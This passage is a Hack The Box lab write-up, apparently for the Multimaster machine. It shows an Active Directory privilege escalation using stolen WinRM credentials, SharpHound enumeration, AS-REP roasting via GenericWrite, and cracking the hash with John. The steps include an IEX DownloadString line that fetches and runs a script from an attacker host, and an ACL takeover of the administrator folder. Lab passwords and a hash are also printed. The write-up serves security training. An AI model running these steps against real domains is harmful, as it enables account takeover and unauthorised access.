By using the credentials for `sbauer`, we can upload `SharpHound.exe` and see if we have any interesting attack paths.

```bash
$ evil-winrm -i 10.129.247.110 -u sbauer -p 'D3veL0pM3nT!'

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\desktop> wget http://10.10.14.20/SharpHound.exe -O SharpHound.exe
*Evil-WinRM* PS C:\Users\sbauer\desktop> .\SharpHound.exe
2022-06-05T13:21:01.7706413-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-05T13:21:01.7862168-07:00|INFORMATION|Initializing SharpHound at 1:21 PM on 6/5/2022
2022-06-05T13:21:26.1161228-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-05T13:21:26.2491950-07:00|INFORMATION|Beginning LDAP search for MEGACORP.LOCAL
2022-06-05T13:21:26.2846381-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-05T13:21:26.2846381-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-05T13:21:57.1669174-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2022-06-05T13:22:27.1818070-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2022-06-05T13:22:35.2786051-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-05T13:22:35.3098556-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-05T13:22:35.6518870-07:00|INFORMATION|Status: 127 objects finished (+127 1.84058)/s -- Using 40 MB RAM
2022-06-05T13:22:35.6518870-07:00|INFORMATION|Enumeration finished in 00:01:09.4223856
2022-06-05T13:22:35.7925198-07:00|INFORMATION|SharpHound Enumeration Completed at 1:22 PM on 6/5/2022! Happy Graphing!
*Evil-WinRM* PS C:\Users\sbauer\desktop> ls


    Directory: C:\Users\sbauer\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/5/2022   1:22 PM          13458 20220605132235_BloodHound.zip
-a----         6/5/2022   1:20 PM         906752 SharpHound.exe
-a----         6/5/2022   1:22 PM          13441 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin

```

Now, you can import the generated file (*20220605132235_BloodHound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.


The user `sbauer` has *GenericWrite* access to the user `jorden`.

![image-center](/images/htb/htb_multimaster_sbauer.png){: .align-center}

Generic write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user. 

Given we would like to have more access to the remote computer, let's see if we can get the password hash for `jorden`. The easiest path would be to enable the **"Do not require Kerberos preauthentication"** property on `jorden`.

## ASREPRoast

As a reminder, AS-REP roasting is a technique that allows retrieving password hashes for users that have the **"Do not require Kerberos preauthentication"** property selected. Indeed, if a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.

With our *GenericWrite* privilege, it is easy to do.

```bash
*Evil-WinRM* PS C:\Users\sbauer\desktop> Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```

Now, using [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), which can list and get TGTs for the users that have the property set to **UF_DONT_REQUIRE_PREAUTH**, we can retrieve **jorden** hash.

```bash
$ impacket-GetNPUsers megacorp.local/jorden -dc-ip 10.129.247.110         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Cannot authenticate jorden, getting its TGT
$krb5asrep$23$jorden@MEGACORP.LOCAL:96c21e37353a6d3e7088cca6b9386a46$33fc899ab36a6a68c272f6f37e37ad5e1ddaf10471a09fcfea74160d446ba1f3fe68d19a42f26a30b89d7a08b14284c26dd63e8e1bdf3e836526f4d4ef9832de0ba1186118c79b6c749193f0046d491e2178ff54a2acbdf75cd3fd080c2ffc06162a92b601e5049477e7eb93da12f5bef7a4800f803aef5934f8e467d6d70426d33ae21af1d50eed335c06e0e905a68b51802deb1c134dded198776bdc1c7b03d01edefcc7fdb0c3114f01bd566a004453a6412ab5e6d36ea6d413a5bac44e36e7890683912e26e311c447047c03311aecb203e1e968cfbbe95b8a09a8be57f412e194bf4606e8dc9514a2491beb0cc4
```

You just have to copy/paste the recovered hash in a file and try to crack it offline using the *rockyou* (or any other list) passwords list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). 

Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john jorden.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)     
1g 0:00:00:06 DONE (2022-06-05 16:28) 0.1547g/s 681372p/s 681372c/s 681372C/s rainian..raincole
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Recon as Jorden

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.


```bash
$ evil-winrm -i 10.129.247.110 -u jorden -p rainforest786

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents>
```

Nice, let's see what kind of privileges we have.

```bash
*Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

**SeBackupPrivilege**, this is interesting.

## Abusing Tokens

The **SeBackupPrivilege** privilege causes the system to grant all read access control to any file (read only). It means that we could read the **root.txt** by abusing this token. 

Using a tool called [Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1), we were able to change the access rights of the **svc_backup** and allow him to read the **administrator** folder.

```bash
*Evil-WinRM* PS C:\Users\jorden\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/Acl-FullControl.ps1')
*Evil-WinRM* PS C:\Users\jorden\Documents> Acl-FullControl -user megacorp\jorden -path c:\users\administrator
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         MEGACORP\Administrator Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)



[+] Changing permissions to c:\users\administrator
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         MEGACORP\Administrator Allow  FullControl
         MEGACORP\jorden Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-3167813660-1240564177-918740779-3110)
```

Now, we should have the necessary rights to read the **root.txt** file and get the **second flag**.

```bash
*Evil-WinRM* PS C:\Users\jorden\Documents> dir c:\users\administrator\desktop


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/5/2022  10:07 AM             34 root.txt

```

Awesome! I hope you enjoyed it, I know I did :)
